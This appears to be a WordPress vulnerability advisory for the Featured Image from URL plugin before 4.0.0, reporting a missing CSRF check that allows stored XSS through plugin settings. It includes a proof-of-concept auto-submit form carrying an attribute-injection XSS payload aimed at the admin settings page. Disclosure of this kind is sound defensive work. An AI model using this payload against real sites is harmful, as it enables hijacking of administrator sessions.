## WordPress Plugin Vulnerabilities

# Featured Image from URL < 4.0.0 - Arbitrary Settings Update to Stored XSS via CSRF

### Description

The plugin does not have CSRF check in place when updating its settings, which could allow attackers to make a logged in admin change them via a CSRF attack. Furthermore, due to the lack of validation, sanitisation and escaping in some of them, it could also lead to Stored XSS issues

### Proof of Concept

<form action="https://example.com/wp-admin/admin.php?page=featured-image-from-url" method="POST">
<input type="hidden" name="fifu\_input\_photon" value='on" style=animation-name:rotation onanimationstart=alert(/XSS/)//'/>
<input type="submit" value="Submit request" />
</form>
All settings appear to be affected.
The XSS will be triggered when accessing the settings again

### Affects Plugins
